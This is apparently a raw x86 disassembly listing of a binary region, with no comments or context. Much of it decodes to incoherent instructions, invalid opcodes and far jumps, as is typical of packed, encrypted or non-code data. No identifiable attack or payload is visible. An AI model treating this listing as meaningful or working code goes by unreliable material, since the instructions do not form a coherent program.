  40b2ec:	aad    0xa2
  40b2ee:	jmp    0x4eb7:0x7f36d55a
  40b2f5:	imul   ebx,DWORD PTR [ebx+0x68],0xffffffde
  40b2f9:	fbstp  TBYTE PTR ds:0x6ab45a00
  40b2ff:	lods   eax,DWORD PTR ds:[esi]
  40b300:	mov    al,0x6e
  40b302:	jg     0x40b35f
  40b304:	stc    
  40b305:	test   ebp,ebp
  40b307:	lds    ebp,FWORD PTR [esi-0x6f]
  40b30a:	xchg   esp,eax
  40b30b:	or     bh,0x0
  40b30e:	sbb    esi,edi
  40b310:	lds    edi,FWORD PTR [ebx+ebx*8-0x4a]
  40b314:	mov    al,0x6d
  40b316:	mov    ebx,fs
  40b318:	pop    edi
  40b319:	jmp    0x4311:0xaae069e8
  40b320:	(bad)  
  40b322:	fidiv  DWORD PTR [esi+0x6b5d6e70]
  40b328:	mov    esi,0x41120adf
  40b32d:	inc    esp
  40b32e:	jae    0x40b2b1
  40b330:	ret    0xd276
  40b333:	pop    ds
  40b334:	pop    edi
  40b335:	and    eax,ebp
  40b337:	aas    
  40b338:	int3   
  40b339:	out    0x33,al
  40b33b:	jb     0x40b386
  40b33d:	xlat   BYTE PTR ds:[ebx]
  40b33e:	inc    esi
  40b33f:	jg     0x40b33a
  40b341:	xchg   esi,eax
  40b342:	jns    0x40b361
  40b344:	and    ecx,edi
  40b346:	dec    eax
  40b347:	sbb    DWORD PTR [ecx-0x52607748],0xffffffd2
  40b34e:	mov    WORD PTR [ebx+eiz*1],?
  40b351:	xchg   ecx,eax
  40b352:	inc    edx
  40b353:	shl    BYTE PTR [edi+0x23],1
  40b356:	int    0xc8
  40b358:	xor    eax,esp
  40b35a:	je     0x40b357
  40b35c:	add    ebx,esp
  40b35e:	xor    edx,edx
  40b360:	mov    WORD PTR [esi+ebp*1],?
  40b363:	sub    DWORD PTR [ebx],edi
  40b365:	and    BYTE PTR [esi-0x3f373493],dh
  40b36b:	inc    esp
  40b36c:	jmp    0x39b51494
  40b371:	shl    DWORD PTR [esi-0x68249250],1
  40b377:	push   eax
  40b378:	or     DWORD PTR [edi+0x6a592cd1],edi
  40b37e:	idiv   BYTE PTR [edi-0x3d3d3d13]
  40b384:	test   eax,0xf93467d6
  40b389:	push   edx
  40b38a:	push   ss
  40b38b:	push   ds
  40b38c:	ja     0x40b35d
  40b38e:	dec    eax
  40b38f:	push   edi
  40b390:	or     ecx,0x17
  40b393:	jg     0x40b31e
  40b395:	mov    dh,0x66
  40b397:	repnz mov WORD PTR [ebx+eiz*1],?
  40b39b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b39c:	jae    0x40b368
  40b39e:	dec    eax
  40b39f:	mov    WORD PTR [ecx+0x49],?
  40b3a2:	xor    edx,eax
  40b3a4:	pop    ebp
  40b3a5:	xor    bl,BYTE PTR [edi+0x33c8cd1d]
  40b3ab:	rol    BYTE PTR [edi],cl
  40b3ad:	add    al,0x24
  40b3af:	adc    eax,0x3c8cd2d1
  40b3b4:	and    ebp,DWORD PTR [esi+edi*8]
  40b3b7:	inc    eax
  40b3b8:	jmp    0x40b3dd
  40b3ba:	int    0xc8
  40b3bc:	xor    esi,DWORD PTR [edi-0x70]
  40b3bf:	addr16 test eax,esi
  40b3c2:	xor    edx,edx
  40b3c4:	mov    WORD PTR [edx+ecx*4],?
  40b3c7:	mov    edi,DWORD PTR [edi-0x46]
  40b3ca:	leave  
  40b3cb:	xor    esi,DWORD PTR [edx]
  40b3cd:	leave  
  40b3ce:	ins    BYTE PTR es:[edi],dx
  40b3cf:	pop    ecx
  40b3d0:	aam    0x36
  40b3d2:	int    0xc8
  40b3d4:	xor    esi,DWORD PTR [edx]
  40b3d6:	and    ebp,DWORD PTR [eax]
  40b3d8:	sbb    BYTE PTR [esi],dl
  40b3da:	or     eax,0x233c8cd2
  40b3df:	aas    
  40b3e0:	loop   0x40b441
  40b3e2:	xlat   BYTE PTR ds:[ebx]
  40b3e3:	and    ecx,ebp
  40b3e5:	enter  0x4d33,0xd4
  40b3e9:	addr16 mov eax,ds:0x3373
  40b3ed:	ror    BYTE PTR [esp+edi*1-0x42645e72],cl
  40b3f4:	cmp    al,0x23
  40b3f6:	int    0xc8
  40b3f8:	pusha  
  40b3f9:	test   eax,0xc85adf75
  40b3fe:	xor    edx,edx
  40b400:	mov    esi,gs
  40b402:	das    
  40b403:	icebp  
  40b404:	cmp    al,0x93
  40b406:	cmp    al,0x23
  40b408:	int    0x74
  40b40a:	in     eax,0x27
  40b40c:	or     bl,BYTE PTR [edi]
  40b40e:	ror    BYTE PTR [esp+edi*1+0x702c4c23],cl
  40b415:	cmp    DWORD PTR ds:0x7833c8cd,esp
  40b41b:	push   esi
  40b41c:	mov    fs,WORD PTR [ebx+0x3c]
  40b41f:	and    ecx,ebp
  40b421:	enter  0xb578,0x8d
  40b425:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b426:	mov    ds:0x8cd25c93,al
  40b42b:	out    dx,eax
  40b42c:	mov    bh,0x34
  40b42e:	and    edx,edx
  40b430:	mov    WORD PTR [ebx+eiz*1],?
  40b433:	add    al,0xe
  40b435:	cmp    ebx,edi
  40b437:	and    ecx,ebp
  40b439:	enter  0x3033,0xe0
  40b43d:	inc    eax
  40b43e:	aad    0x20
  40b440:	xor    edx,edx
  40b442:	mov    WORD PTR [eax+ebx*2],?
  40b445:	pop    edi
  40b446:	dec    ebp
  40b447:	popf   
  40b448:	xor    edx,edx
  40b44a:	ror    al,0x72
  40b44d:	nop
  40b44e:	aas    
  40b44f:	test   BYTE PTR [si],bh
  40b452:	and    ecx,ebp
  40b454:	enter  0xd484,0xb1
  40b458:	fisubr DWORD PTR [esi-0x732dcc37]
  40b45e:	icebp  
  40b45f:	fndisi(8087 only) 
  40b461:	lock mov WORD PTR [ebx+eiz*1],?
  40b465:	xor    ebp,esp
  40b467:	pop    ds
  40b468:	sbb    ebx,DWORD PTR [edx]
  40b46a:	sub    ecx,ebp
  40b46c:	enter  0xd233,0xf
  40b470:	pop    esi
  40b471:	cmp    al,0x68
  40b473:	dec    ecx
  40b474:	ror    BYTE PTR [esp+edi*1-0x73a992dd],cl
  40b47b:	arpl   WORD PTR [ebx],sp
  40b47d:	int    0xc8
  40b47f:	xor    edx,DWORD PTR [eax+ecx*4+0x33eabfcc]
  40b486:	ror    BYTE PTR [esp+edi*1-0x1c663e74],cl
  40b48d:	repnz mov WORD PTR [ecx],?
  40b490:	leave  
  40b491:	test   bl,0x9f
  40b494:	add    eax,0x48cf23d8
  40b499:	xor    esi,DWORD PTR [ecx]
  40b49b:	sub    eax,0x33440214
  40b4a0:	repnz mov WORD PTR [edi+edx*1],?
  40b4a4:	push   0x54
  40b4a6:	popa   
  40b4a7:	xor    al,0x23
  40b4a9:	iret   
  40b4aa:	dec    eax
  40b4ab:	inc    ecx
  40b4ac:	xchg   ecx,eax
  40b4ad:	outs   dx,BYTE PTR ds:[esi]
  40b4ae:	mov    eax,0xb6b6d89b
  40b4b3:	mov    eax,cs
  40b4b5:	jne    0x40b4cb
  40b4b7:	bound  ecx,QWORD PTR [edx+0x5db63fd7]
  40b4bd:	ficomp WORD PTR [edx+0x5cec957f]
  40b4c3:	add    BYTE PTR [edx],ch
  40b4c5:	fldenv [edi+edi*4+0x35]
  40b4c9:	cwde   
  40b4ca:	enter  0xb707,0xa5
  40b4ce:	jp     0x40b51a
  40b4d0:	inc    edi
  40b4d1:	jnp    0x40b47b
  40b4d3:	pop    edi
  40b4d4:	jmp    0xcd63f165
  40b4d9:	xlat   BYTE PTR ds:[ebx]
  40b4da:	sahf   
  40b4db:	repnz mov bl,0x9
  40b4de:	int    0xc8
  40b4e0:	xor    edx,edx
  40b4e2:	mov    eax,0x52304539
  40b4e7:	rol    ah,cl
  40b4e9:	enter  0x7f25,0x4c
  40b4ed:	jg     0x40b4fb
  40b4ef:	mov    WORD PTR [ecx+ecx*8],?
  40b4f2:	xor    edi,DWORD PTR [edx+0x11]
  40b4f5:	es mov edi,0x3348cf83
  40b4fb:	repnz retf 
  40b4fd:	test   eax,0xf2edcbd0
  40b502:	mov    WORD PTR [ebx+eiz*1],?
  40b505:	xlat   BYTE PTR ds:[ebx]
  40b506:	cli    
  40b507:	rcl    DWORD PTR [edi+0x3348cf23],1
  40b50d:	jl     0x40b4aa
  40b50f:	cmp    eax,DWORD PTR [eax-0x730dcce4]
  40b515:	xor    al,0x75
  40b517:	pop    es
  40b518:	pop    edx
  40b519:	dec    ecx
  40b51a:	xor    al,0x23
  40b51c:	iret   
  40b51d:	dec    eax
  40b51e:	dec    edi
  40b51f:	ins    BYTE PTR es:[edi],dx
  40b520:	cmp    al,0x42
  40b522:	sub    DWORD PTR [eax+0x33],ecx
  40b525:	repnz mov WORD PTR [edi-0x730c4ffa],ds
  40b52c:	xor    al,0x23
  40b52e:	iret   
  40b52f:	lods   al,BYTE PTR ds:[esi]
  40b530:	call   0xd0139306
  40b535:	dec    eax
  40b536:	xor    esi,edx
  40b538:	mov    dl,0xdc
  40b53a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b53b:	sbb    DWORD PTR [edx+esi*8+0x1023348c],eax
  40b542:	xchg   ecx,eax
  40b543:	cmp    BYTE PTR [esi-0x62],bh
  40b546:	iret   
  40b547:	dec    eax
  40b548:	xor    edi,DWORD PTR [ebp+0x4b]
  40b54b:	sub    BYTE PTR ds:0xf3cd4707,dh
  40b551:	imul   ebp,DWORD PTR [esi+0x42],0x6f481b00
  40b558:	das    
  40b559:	stos   BYTE PTR es:[edi],al
  40b55a:	jl     0x40b515
  40b55c:	jns    0x40b59c
  40b55e:	int    0x0
  40b560:	inc    ebx
  40b561:	mov    bh,0x81
  40b563:	push   edi
  40b564:	test   al,0x96
  40b566:	add    BYTE PTR [ebx+0x48],ch
  40b569:	push   ebx
  40b56a:	iret   
  40b56b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b56c:	aam    0xbb
  40b56e:	jg     0x40b569
  40b570:	aas    
  40b571:	rol    BYTE PTR [ecx+0x3b],0xe4
  40b575:	sar    edx,cl
  40b577:	mov    edi,0x20f7a7dd
  40b57c:	call   0x1423:0x5fd3e79b
  40b583:	iret   
  40b584:	and    eax,DWORD PTR [ecx]
  40b586:	add    bl,ah
  40b588:	dec    eax
  40b589:	dec    edi
  40b58a:	jae    0x40b57f
  40b58c:	jl     0x40b5cc
  40b58e:	neg    DWORD PTR [ebp+0x2b]
  40b591:	add    BYTE PTR [ebx],cl
  40b593:	push   esi
  40b594:	inc    eax
  40b595:	repz imul ebp,DWORD PTR [esi-0x62],0x75951f
  40b59d:	xor    eax,DWORD PTR [edx+ebp*2-0x32c186b9]
  40b5a4:	int    0xb1
  40b5a6:	lahf   
  40b5a7:	add    BYTE PTR [ebx-0x7f],bl
  40b5aa:	lods   al,BYTE PTR ds:[esi]
  40b5ab:	outs   dx,DWORD PTR ds:[esi]
  40b5ac:	lods   al,BYTE PTR ds:[esi]
  40b5ad:	aaa    
  40b5ae:	iret   
  40b5af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5b0:	mov    ecx,0xdd810006
  40b5b5:	jnp    0x40b54c
  40b5b7:	cld    
  40b5b8:	jo     0x40b5ba
  40b5ba:	test   eax,0x34f9e6e6
  40b5bf:	sbb    DWORD PTR [ebp-0x43],ebx
  40b5c2:	sub    BYTE PTR [edx-0x49652f00],ch
  40b5c8:	and    DWORD PTR [edi+0x62e5b718],ebx
  40b5ce:	stc    
  40b5cf:	mov    edi,0xf3721e4f
  40b5d4:	jl     0x40b5bf
  40b5d6:	or     eax,0x2100fe6f
  40b5db:	ret    
  40b5dc:	xor    eax,0x79b9a7cf
  40b5e1:	xchg   edi,eax
  40b5e2:	fadd   DWORD PTR [eax]
  40b5e4:	dec    ecx
  40b5e5:	mov    ds:0xe6bc5d35,eax
  40b5ea:	stc    
  40b5eb:	xor    al,0x37
  40b5ed:	xchg   BYTE PTR [eax],al
  40b5ef:	jae    0x40b5b5
  40b5f1:	fwait
  40b5f2:	xchg   edi,esp
  40b5f4:	fdivr  QWORD PTR [edi+ebx*4]
  40b5f7:	out    0xd0,al
  40b5f9:	add    BYTE PTR [ebx+0x1eaffdf4],bl
  40b5ff:	jmp    0xd3e7:0x9b9ac300
  40b606:	cmp    edx,DWORD PTR [edi]
  40b608:	xlat   BYTE PTR ds:[ebx]
  40b609:	and    eax,0x44eb0004
  40b60e:	dec    edi
  40b60f:	jae    0x40b604
  40b611:	jl     0x40b63c
  40b613:	call   FWORD PTR [ebp+0x5e]
  40b616:	add    BYTE PTR [ebx],dl
  40b618:	or     BYTE PTR [eax-0xd],dh
  40b61b:	imul   ebp,DWORD PTR [esi-0x62],0x459827
  40b622:	cmp    edx,DWORD PTR [ebx+0x233c4faa]
  40b628:	int    0xc8
  40b62a:	mov    eax,0xc777ca63
  40b62f:	enter  0xd233,0x8c
  40b633:	mov    edi,ebp
  40b635:	lahf   
  40b636:	or     al,0x3e
  40b638:	in     al,0xd3
  40b63a:	shl    DWORD PTR [ebx-0x3827fea1],0x2d
  40b641:	add    bl,bl
  40b643:	int    0xcd
  40b645:	repz imul eax,DWORD PTR [eax-0x68],0x8d6fed
  40b64d:	add    DWORD PTR [ebp-0x59],ebp
  40b650:	mov    ecx,0x15f23e79
  40b655:	jbe    0x40b638
  40b657:	add    BYTE PTR [ecx],ch
  40b659:	mov    bh,0xf9
  40b65b:	xor    al,0x37
  40b65d:	iret   
  40b65e:	lds    edi,FWORD PTR ds:0x510032ae
  40b664:	cwde   
  40b665:	das    
  40b666:	and    DWORD PTR gs:[edi+0x1cdbe6e6],ebx
  40b66d:	add    BYTE PTR [ecx-0x2d],bh
  40b670:	jle    0x40b5ff
  40b672:	cmp    al,0x9f
  40b674:	mov    es,edx
  40b676:	imul   ebp,DWORD PTR [eax],0xffffff9f
  40b679:	or     al,0x5c
  40b67b:	mov    ch,0xb
  40b67d:	fwait
  40b67e:	out    0xd3,eax
  40b680:	fadd   QWORD PTR [edi+0x0]
  40b683:	leave  
  40b684:	and    esp,DWORD PTR [ecx+0x133cdd]
  40b68a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b68b:	sbb    DWORD PTR [ecx-0x66],edi
  40b68e:	repz inc esp
  40b690:	or     BYTE PTR [edi+0x7d],ah
  40b693:	inc    esi
  40b694:	call   0x479e:0x52746791
  40b69b:	mov    ah,0x67
  40b69d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b69e:	sbb    DWORD PTR [ecx-0x5c],edi
  40b6a1:	mov    eax,ds:0x4679deb1
  40b6a6:	call   0xde88:0xebdd9e91
  40b6ad:	xchg   ecx,eax
  40b6ae:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40b6b0:	sbb    DWORD PTR ds:0x190004eb,edx
  40b6b6:	jns    0x40b6fe
  40b6b8:	call   0xf254:0x2a59153a
  40b6bf:	dec    ebx
  40b6c0:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40b6c2:	aas    
  40b6c3:	jns    0x40b70c
  40b6c5:	lods   al,BYTE PTR ds:[esi]
  40b6c6:	rol    DWORD PTR [eax],cl
  40b6c8:	push   edx
  40b6c9:	or     eax,0xda3747e7
  40b6ce:	sbb    BYTE PTR [edi+0x0],0x4e
  40b6d2:	sbb    bh,0x69
  40b6d5:	lods   eax,DWORD PTR ds:[esi]
  40b6d6:	repz jl 0x40b673
  40b6d9:	fwait
  40b6da:	ds jle 0x40b6dd
  40b6dd:	sar    DWORD PTR ds:0x6e23d583,0x9e
  40b6e4:	dec    edi
  40b6e5:	jae    0x40b67f
  40b6e7:	add    cl,ch
  40b6e9:	jg     0x40b6a0
  40b6eb:	std    
  40b6ec:	ins    BYTE PTR es:[edi],dx
  40b6ed:	ret    0x1100
  40b6f0:	sub    bl,BYTE PTR [edx+esi*8]
  40b6f3:	imul   ebp,DWORD PTR [ebp-0x21],0x348eec25
  40b6fa:	pop    ds
  40b6fb:	bnd jmp 0x4d426280
  40b701:	push   ss
  40b702:	add    BYTE PTR [ecx-0x3f],ah
  40b705:	sahf   
  40b706:	xchg   ecx,eax
  40b707:	out    0xf9,al
  40b709:	sub    esi,DWORD PTR [ebp-0x1f]
  40b70c:	shr    al,0xad
  40b70f:	jl     0x40b729
  40b711:	imul   eax,DWORD PTR [esi+0x3d],0x62df689a
  40b718:	lds    esp,FWORD PTR [ebx]
  40b71a:	dec    edi
  40b71b:	jae    0x40b710
  40b71d:	push   es
  40b71e:	xchg   edi,eax
  40b71f:	add    cl,bl
  40b721:	and    eax,0xf2334bb4
  40b726:	mov    WORD PTR [ecx+eiz*4],?
  40b729:	dec    ebx
  40b72a:	fisub  WORD PTR [ecx+0x34]
  40b72d:	and    ecx,edi
  40b72f:	dec    eax
  40b730:	retf   
  40b731:	test   al,ah
  40b733:	mov    dl,BYTE PTR ds:0x8cf23348
  40b739:	test   eax,0xcf3fd80a
  40b73e:	enter  0xcf24,0xd5
  40b742:	dec    esp
  40b743:	pop    ecx
  40b744:	cmp    eax,0x348cf266
  40b749:	and    ebx,DWORD PTR [ebx+esi*2]
  40b74c:	adc    DWORD PTR [eax+0x4f34f90e],ebx
  40b752:	xchg   DWORD PTR [eax],eax
  40b754:	icebp  
  40b755:	inc    edi
  40b756:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b757:	add    eax,0x74f9e6d1
  40b75c:	xchg   ebp,eax
  40b75d:	xchg   BYTE PTR [edi+0x65],bh
  40b760:	(bad)  
  40b761:	sub    eax,0x9f3cdca7
  40b766:	out    0xd2,al
  40b768:	add    BYTE PTR [ecx-0x76],al
  40b76b:	sub    DWORD PTR [ebp-0x79],edx
  40b76e:	add    BYTE PTR ds:[ecx+0x69],ch
  40b772:	ds in  al,0xd3
  40b775:	fsubr  QWORD PTR [edi]
  40b777:	jge    0x40b7d5
  40b779:	add    BYTE PTR [ecx-0x3232c10f],dl
  40b77f:	repz jg 0x40b727
  40b782:	adc    DWORD PTR [eax+eax*1-0x47],ecx
  40b786:	pop    es
  40b787:	cdq    
  40b788:	int    0xcf
  40b78a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b78b:	mov    ecx,0xd94c79
  40b790:	loope  0x40b811
  40b792:	out    0xf5,al
  40b794:	inc    ecx
  40b795:	out    0xf9,al
  40b797:	xor    al,0x37
  40b799:	repz add BYTE PTR [ecx],cl
  40b79c:	fs cwde 
  40b79e:	sbb    eax,0x9f3cdcbf
  40b7a3:	out    0xad,al
  40b7a5:	add    BYTE PTR [ecx],dh
  40b7a7:	xchg   DWORD PTR [edx+0x47b945],esi
  40b7ad:	pop    ecx
  40b7ae:	inc    esi
  40b7af:	call   0xcd6d:0x64add3e7
  40b7b6:	jno    0x40b7ae
  40b7b8:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40b7ba:	sbb    DWORD PTR [ecx+0xe],edi
  40b7bd:	loopne 0x40b7da
  40b7bf:	cmp    al,0x79
  40b7c1:	inc    esi
  40b7c2:	call   0xda26:0xc5353091
  40b7c9:	xchg   ecx,eax
  40b7ca:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40b7cc:	sbb    DWORD PTR [ecx-0x11],edx
  40b7cf:	popa   
  40b7d0:	cld    
  40b7d1:	arpl   WORD PTR [ebx+0x23],bp
  40b7d4:	retf   
  40b7d5:	or     al,0x4d
  40b7d7:	jmp    0x97e7bd84
  40b7dc:	inc    edx
  40b7dd:	ja     0x40b80f
  40b7df:	pusha  
  40b7e0:	popa   
  40b7e1:	sbb    DWORD PTR [ecx],0x74
  40b7e4:	aas    
  40b7e5:	test   BYTE PTR [eax],bh
  40b7e7:	add    ah,bh
  40b7e9:	(bad)  
  40b7ea:	mov    dh,0xed
  40b7ec:	in     al,dx
  40b7ed:	mov    al,ds:0x88388126
  40b7f2:	gs pop edi
  40b7f4:	cli    
  40b7f5:	mov    edx,0xb6d85c3c
  40b7fa:	or     al,0x47
  40b7fc:	pop    ss
  40b7fd:	retf   
  40b7fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7ff:	sub    BYTE PTR [esi],dl
  40b801:	mov    dl,0x7f
  40b803:	and    al,dl
  40b805:	inc    edx
  40b806:	mov    ebx,0x24fd32d
  40b80b:	setp   BYTE PTR [ecx+0x73]
  40b80f:	xchg   edx,ecx
  40b811:	lods   eax,DWORD PTR ds:[esi]
  40b812:	out    0xed,al
  40b814:	ret    0xdf57
  40b817:	fld    QWORD PTR ds:0x5e0086bf
  40b81d:	nop
  40b81e:	pop    ds
  40b81f:	inc    esi
  40b820:	call   0xabba:0xfbff9b
  40b827:	add    cl,dh
  40b829:	jp     0x40b82b
  40b82b:	push   esi
  40b82c:	mov    ebp,0x3c869200
  40b831:	mov    bh,0xd8
  40b833:	sbb    bh,BYTE PTR [ecx-0x65]
  40b836:	or     ch,BYTE PTR [ecx-0x72501584]
  40b83c:	sbb    edx,DWORD PTR [edi+0x437a6d1a]
  40b842:	xchg   ecx,eax
  40b843:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b844:	xchg   esi,eax
  40b845:	pop    ecx
  40b846:	lock jno 0x40b8b4
  40b849:	pop    ss
  40b84a:	mov    esi,0x8a1600cb
  40b84f:	mov    bh,0x5f
  40b851:	adc    DWORD PTR ds:0x98ef8a46,edi
  40b857:	shl    BYTE PTR [esi-0x207c94e3],0x19
  40b85e:	ret    
  40b85f:	and    BYTE PTR [ecx],al
  40b861:	mov    eax,gs
  40b863:	fcomp  QWORD PTR [esi-0x2]
  40b866:	(bad)  
  40b867:	lahf   
  40b868:	ret    
  40b869:	add    BYTE PTR [ecx],dh
  40b86b:	rol    BYTE PTR [eax],1
  40b86d:	pushf  
  40b86e:	xchg   ebp,eax
  40b86f:	add    BYTE PTR [eax+edi*8+0x419d0060],dl
  40b876:	mov    BYTE PTR [ebp+0x6c8b6216],bh
  40b87c:	lahf   
  40b87d:	inc    ebp
  40b87e:	mov    ecx,0x64683f97
  40b883:	mov    ebx,DWORD PTR [ebx-0x25]
  40b886:	pop    edi
  40b887:	ja     0x40b818
  40b889:	out    0x50,al
  40b88b:	std    
  40b88c:	call   DWORD PTR [edx]
  40b88e:	dec    esp
  40b88f:	xor    eax,0xd7295b6e
  40b894:	ja     0x40b8ce
  40b896:	sub    bh,bh
  40b898:	or     al,0xcf
  40b89a:	gs stc 
  40b89c:	xchg   edi,eax
  40b89d:	pop    edi
  40b89e:	adc    al,0xd8
  40b8a0:	add    BYTE PTR [ecx+0x19],ah
  40b8a3:	add    ah,cl
  40b8a5:	mov    ecx,0x23cab17
  40b8aa:	pop    ebx
  40b8ab:	pop    ebx
  40b8ac:	mov    eax,ds:0x69322c4a
  40b8b1:	pop    ebx
  40b8b2:	hlt    
  40b8b3:	inc    esi
  40b8b5:	jbe    0x40b91b
  40b8b7:	stc    
  40b8b8:	pop    ecx
  40b8b9:	sub    BYTE PTR [eax],al
  40b8bb:	inc    esp
  40b8bd:	sub    al,0x18
  40b8bf:	das    
  40b8c0:	leave  
  40b8c1:	loope  0x40b898
  40b8c3:	push   0xa8728dc4
  40b8c8:	cdq    
  40b8c9:	sbb    al,dh
  40b8cb:	fcmove st,st(0)
  40b8cd:	repnz mov ecx,0xbc2e1f1f
  40b8d3:	sub    eax,0x711d8879
  40b8d8:	arpl   bx,bx
  40b8da:	imul   esp,DWORD PTR ss:[edi+ebx*2-0x5d],0x90874d14
  40b8e3:	ins    DWORD PTR es:[edi],dx
  40b8e4:	ins    DWORD PTR es:[edi],dx
  40b8e5:	fcmovnb st,st(0)
  40b8e7:	mov    esp,0x600ceff
  40b8ec:	and    DWORD PTR [esi+0x1bb05e5f],0x36
  40b8f3:	or     dh,BYTE PTR [edi-0x4791a60a]
  40b8f9:	and    eax,0xae1f6839
  40b8fe:	add    bl,cl
  40b900:	or     esi,DWORD PTR [edi+0x26ff5b91]
  40b906:	and    al,al
  40b908:	jg     0x40b939
  40b90a:	add    BYTE PTR ds:0x916db6a0,ah
  40b910:	lods   eax,DWORD PTR ds:[esi]
  40b911:	inc    ebx
  40b912:	jg     0x40b93c
  40b914:	and    BYTE PTR [eax],bh
  40b916:	mov    ecx,0xa01bda1c
  40b91b:	jns    0x40b8fe
  40b91d:	aam    0xb5
  40b91f:	fbld   TBYTE PTR [esi]
  40b921:	add    BYTE PTR [esi-0x32c780e0],ch
  40b927:	lods   eax,DWORD PTR ds:[esi]
  40b928:	jl     0x40b97d
  40b92a:	out    0x0,al
  40b92c:	jno    0x40b92a
  40b92e:	aas    
  40b92f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b931:	add    BYTE PTR [eax+0x18],ch
  40b934:	sub    al,0x72
  40b936:	repz rol BYTE PTR [ebp+0xd7c97ed],cl
  40b93d:	mov    edi,0xe8670063
  40b942:	add    cl,ah
  40b944:	lea    ebp,[edi+edi*2]
  40b947:	out    0x52,eax
  40b949:	jb     0x40b90a
  40b94b:	jo     0x40b94d
  40b94d:	std    
  40b94e:	shr    BYTE PTR [edi],1
  40b950:	mov    dh,0xa5
  40b952:	ucomiss xmm2,DWORD PTR [edi]
  40b955:	sbb    BYTE PTR [edi],dh
  40b957:	pop    edi
  40b958:	in     al,0xaa
  40b95a:	enter  0xb4c8,0x8d
  40b95e:	inc    edi
  40b95f:	push   ss
  40b960:	call   0x604016c4
  40b965:	pop    eax
  40b966:	add    BYTE PTR [edi],dh
  40b968:	daa    
  40b969:	(bad)  
  40b96a:	in     eax,dx
  40b96b:	mov    dh,0xb9
  40b96d:	fdivr  DWORD PTR [edi-0x1b2882e6]
  40b973:	jp     0x40b967
  40b975:	cmc    
  40b976:	jmp    FWORD PTR [esi-0x31]
  40b979:	in     eax,0xe6
  40b97b:	data16 add BYTE PTR [esi-0x20],ch
  40b97f:	add    cl,ch
  40b981:	inc    edi
  40b982:	jnp    0x40b950
  40b984:	pop    edi
  40b985:	push   ecx
  40b986:	add    BYTE PTR [eax-0x28],bl
  40b989:	mov    bh,BYTE PTR [edi+ebx*4+0x77]
  40b98d:	mov    al,ds:0xd924c449
  40b992:	mov    al,ds:0xb2addb1
  40b997:	sbb    DWORD PTR [edi+0x54],eax
  40b99a:	aas    
  40b99b:	mov    edi,0xb5f6dbe1
  40b9a0:	sbb    al,0xb4
  40b9a2:	adc    eax,0xf5e37f7a
  40b9a7:	jnp    0x40b986
  40b9a9:	jl     0x40b9ce
  40b9ab:	sbb    edx,DWORD PTR [edi-0x20a00f49]
  40b9b1:	add    BYTE PTR ds:0xa6ff558c,dh
  40b9b7:	inc    eax
  40b9b8:	sub    al,0x7c
  40b9ba:	call   0x4fac:0x1f3f386a
  40b9c1:	ror    DWORD PTR [eax-0x4972297f],0x7f
  40b9c8:	sub    al,0x96
  40b9ca:	fxtract 
  40b9cc:	jo     0x40b96d
  40b9ce:	dec    eax
  40b9d0:	jb     0x40ba36
  40b9d2:	mov    dh,0x6c
  40b9d4:	jge    0x40b9f8
  40b9d6:	js     0x40b9d8
  40b9d8:	and    eax,ebp
  40b9da:	add    ah,dl
  40b9dc:	test   al,0x8d
  40b9de:	fdivr  QWORD PTR [esp+ebp*1]
  40b9e1:	mov    bh,0xdf
  40b9e3:	fdiv   QWORD PTR [eax+eax*1+0x2c8c76b3]
  40b9ea:	mov    al,0x2d
  40b9ec:	mov    dh,0xee
  40b9ee:	add    eax,0xa74c3f67
  40b9f3:	(bad)  
  40b9f4:	mov    dh,0xd5
  40b9f6:	cs or  eax,0x434a1086
  40b9fc:	pop    esp
  40b9fd:	add    eax,0xbb6ddf44
  40ba02:	jae    0x40b9fd
  40ba04:	jns    0x40ba4e
  40ba06:	add    BYTE PTR [ecx],bl
  40ba08:	jp     0x40ba54
  40ba0a:	pop    edi
  40ba0b:	popa   
  40ba0c:	inc    esp
  40ba0d:	mov    edi,0x35a96ddd
  40ba12:	das    
  40ba13:	mov    edi,0xd896003e
  40ba18:	jge    0x40b9dc
  40ba1a:	into   
  40ba1b:	cmc    
  40ba1c:	add    DWORD PTR [ebp+0x64],esi
  40ba1f:	mov    DWORD PTR [edi+0x38c76c1f],eax
  40ba25:	sbb    esp,DWORD PTR [ebx]
  40ba27:	or     esi,DWORD PTR [edx+ebx*8]
  40ba2a:	lahf   
  40ba2b:	lahf   
  40ba2c:	push   eax
  40ba2d:	sbb    al,0x3f
  40ba2f:	loope  0x40b9e2
  40ba31:	lea    ebp,[esp+edx*4-0x34]
  40ba35:	lahf   
  40ba36:	test   al,0x4
  40ba38:	pop    edi
  40ba39:	jmp    0xb985f919
  40ba3e:	scas   ax,WORD PTR es:[edi]
  40ba40:	pop    ebp
  40ba41:	pop    ds
  40ba42:	fsubr  QWORD PTR [eax+0x4a]
  40ba45:	jns    0x40ba7c
  40ba47:	in     al,0xc3
  40ba49:	int    0x41
  40ba4b:	pop    edi
  40ba4c:	(bad)  
  40ba4d:	cld    
  40ba4e:	mov    al,0x1f
  40ba50:	push   ebp
  40ba51:	jle    0x40ba1d
  40ba53:	outs   dx,DWORD PTR ds:[esi]
  40ba54:	pop    ebx
  40ba55:	imul   ebx,ebx,0x5f3c6577
  40ba5b:	add    eax,DWORD PTR [ecx]
  40ba5d:	add    BYTE PTR [ecx+0x28],bh
  40ba60:	xlat   BYTE PTR ds:[ebx]
  40ba61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba62:	push   0xc0642bb7
  40ba67:	add    bh,BYTE PTR [edi-0x3f]
  40ba6a:	loopne 0x40baeb
  40ba6c:	ret    0xfcad
